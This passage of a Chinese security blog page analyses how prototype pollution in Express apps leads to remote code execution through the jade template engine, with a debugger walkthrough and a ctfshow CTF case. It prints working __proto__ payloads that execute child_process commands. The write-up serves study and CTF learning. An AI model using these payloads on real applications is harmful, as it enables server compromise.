class="built_in">JSON</span>.parse(malicious_payload));</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    res.render(<span class="string">&#x27;./index.jade&#x27;</span>, &#123;</span><br><span class="line">        title: <span class="string">&#x27;hello&#x27;</span>,</span><br><span class="line">        name: <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">app.use(<span class="string">&#x27;/&#x27;</span>, router)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, <span class="function">() =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&#x27;Example app listening on port http://127.0.0.1:3000 !&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>index.jade</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">h1&#x3D; title</span><br><span class="line">p hello #&#123;name&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接利用上面的payload会报错</p>
+<p><img src="1613890867473.png" alt="1613890867473"></p>
+<p>先调试分析漏洞利用点</p>
+<p>进入jade模块. <code>res.render=&gt;app.render=&gt;tryRender=&gt;view.render=&gt;this.engine</code>,和ejs差不多.</p>
+<p><img src="1613891162165.png" alt="1613891162165"></p>
+<p>入口是renderFile函数.进入</p>
+<p><img src="1613891209987.png" alt="1613891209987"></p>
+<p>注意rendfile函数返回值可执行.进入handleTemplateCache</p>
+<p><img src="1613891248155.png" alt="1613891248155"></p>
+<p>进入compile函数.</p>
+<p><img src="1613891301546.png" alt="1613891301546"></p>
+<p>这点和ejs不同,在compile之前会有parse解析.</p>
+<p>然后可以看到结果返回到parsed,又传递给了fn.</p>
+<p>先不管parse函数,继续向下看代码</p>
+<p><img src="1613891409260.png" alt="1613891409260"></p>
+<p>可以看到parse后的返回值最终会被当作代码执行.</p>
+<p>然后进入parse,审计是否返回值中有可控部分.</p>
+<p><img src="1613891512195.png" alt="1613891512195"></p>
+<p>parse函数内部可以看到先parse再compile.parse结果最终会被拼接到外层parse函数返回值部分</p>
+<p><img src="1613891640298.png" alt="1613891640298"></p>
+<p>然后进入compile函数进行审计</p>
+<p><img src="1613891684445.png" alt="1613891684445"></p>
+<p>可以看到compile函数返回的是buf.</p>
+<p>步入代码,this.visit</p>
+<p><img src="1613891751528.png" alt="1613891751528"></p>
+<p>发现可控的node.line可以被push到buf中.条件是this.debug=True.</p>
+<p><img src="1613892764488.png" alt="1613892764488"></p>
+<p>可以发现payload是成功拼接到buf里的,但是会报错</p>
+<p><img src="1613894266904.png" alt="1613894266904"></p>
+<p>跟进报错信息可以发现在Object.exports.renderFile =&gt; handleTemplateCache=&gt;Object.exports.compile=&gt;parse=&gt;addWith处.</p>
+<p><img src="1613894409463.png" alt="1613894409463"></p>
+<p>令options.self为true可避免进入addWith函数.网上的一些文章payload分析也就到此,但是发现这个payload打不通且没有出现很明显的报错,这点留到后面分析.</p>
+<p>很偶然的情况下我对模板做出了修改,改成如下的,然后发现就可以造成RCE了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">h1 title: #&#123;title&#125;</span><br><span class="line">p hello #&#123;name&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="1613892847603.png" alt="1613892847603"></p>
+<p>初步猜测污染self太粗暴,会影响<code>h1= title</code>这种模板渲染方式(不确定猜测是否正确.)</p>
+<h3 id="3-Ctfshow题目分析"><a href="#3-Ctfshow题目分析" class="headerlink" title="3. Ctfshow题目分析"></a>3. Ctfshow题目分析</h3><p>ctfshow有一道题目也是考察jade链的利用.</p>
+<p>只贴模板信息(其余的都差不多)</p>
+<p>layout.jade</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">doctype html</span><br><span class="line">html</span><br><span class="line">  head</span><br><span class="line">    title&#x3D; title</span><br><span class="line">  body</span><br><span class="line">    block content</span><br></pre></td></tr></table></figure>
+
+<p>index.jade</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">extends layout</span><br><span class="line"></span><br><span class="line">block content</span><br><span class="line">  h1&#x3D; title</span><br><span class="line">  p Welcome to #&#123;title&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将上面分析得到的payload打入.报了如下错误.</p>
+<p><img src="1613973792970.png" alt="1613973792970"></p>
+<p>跟着调用栈分析.最终可以找到在visitNode函数.会有node.type为undefined的情况,</p>
+<p><img src="1613974028363.png" alt="1613974028363"></p>
+<p>正常情况下node.type值为tag/Block等等,然后调用相应函数.</p>
+<p><img src="1613973894835.png" alt="1613973894835"></p>
+<p>解决方法就是把type也污染了.全部测试了一下,发现visitxxx函数及可用的如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">visitAttributes</span><br><span class="line">visitEach</span><br><span class="line">visitCode √</span><br><span class="line">visitBlockComment√</span><br><span class="line">visitComment√</span><br><span class="line">visitText</span><br><span class="line">visitFilter</span><br><span class="line">visitTag</span><br><span class="line">visitMixin</span><br><span class="line">visitDoctype√</span><br><span class="line">visitMixinBlock√</span><br><span class="line">visitBlock</span><br><span class="line">visitLiteral</span><br><span class="line">visitWhen</span><br><span class="line">visitCase</span><br><span class="line">visitNode</span><br></pre></td></tr></table></figure>
+
+<p>payload举例</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;Code&quot;</span>,<span class="attr">&quot;self&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;line&quot;</span>:<span class="string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-填坑"><a href="#4-填坑" class="headerlink" title="4.填坑."></a>4.填坑.</h3><p>最开始的模板.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">h1&#x3D; title</span><br><span class="line">p hello #&#123;name&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行payload会报如下错误.</p>
+<p><img src="1613977699618.png" alt="1613977699618"></p>
+<p>这个具体哪报错也没分析到,但是尝试污染title.</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;title&quot;:&quot;test&quot;,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;calc&#39;)&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现就成功了.</p>
+<p><img src="1613977799878.png" alt="1613977799878"></p>
+<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结."></a>0x03 总结.</h2><p>原型链污染的精髓:undefined属性/值</p>
+<p>下面梳理一下上面有关jade RCE链的payload</p>
+<p>针对普通的模板:只需要污染self和line.</p>
+<ul>
+<li> 包括下面这种</li>
+</ul>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">h1 #&#123;title&#125;</span><br><span class="line">p Welcome to #&#123;title&#125;</span><br></pre></td></tr></table></figure>
+
+<p>有继承的模板: 需要污染type</p>
+<p>顶格的<code>h= title</code>类型的: 污染block属性(title,name这些模板变量)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">h1&#x3D; title</span><br><span class="line">p hello #&#123;name&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p>ejs:</p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6113"> XNUCA2019 Hardjs题解 从原型链污染到RCE </a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">Express+lodash+ejs: 从原型链污染到RCE</a></p>
+</li>
+</ul>
+<p>jade:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7025">https://xz.aliyun.com/t/7025</a></li>
+</ul>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+        </div>
+    </div>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/L0nm4r">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-ejs"><span class="toc-number">2.</span> <span class="toc-text">0x01 ejs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-jade"><span class="toc-number">3.</span> <span class="toc-text">0x02 jade</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%85%88%E8%B4%B4%E4%B8%A4%E4%B8%AA%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">3.1.</span> <span class="toc-text">1.先贴两个利用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">3.2.</span> <span class="toc-text">2. 利用链分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Ctfshow%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">3.3.</span> <span class="toc-text">3. Ctfshow题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%A1%AB%E5%9D%91"><span class="toc-number">3.4.</span> <span class="toc-text">4.填坑.</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">0x03 总结.</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E5%8F%82%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">0x04 参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/&text=几个node模板引擎的原型链污染分析"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/&title=几个node模板引擎的原型链污染分析"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/&is_video=false&description=几个node模板引擎的原型链污染分析"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=几个node模板引擎的原型链污染分析&body=Check out this article: http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/&title=几个node模板引擎的原型链污染分析"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/&title=几个node模板引擎的原型链污染分析"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/&title=几个node模板引擎的原型链污染分析"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/&title=几个node模板引擎的原型链污染分析"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://l0nnnaruu.github.io/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/&name=几个node模板引擎的原型链污染分析&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> 目录</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> 顶部</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> 菜单</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    版权所有 &copy; 2021 L0nm4r
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <li><a href="/">首页</a></li><li><a href="/about/">关于</a></li><li><a href="/archives/">归档</a></li><li><a target="_blank" rel="noopener" href="https://github.com/L0nm4r">项目</a></li>
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-86660611-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'lonmar-cn-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
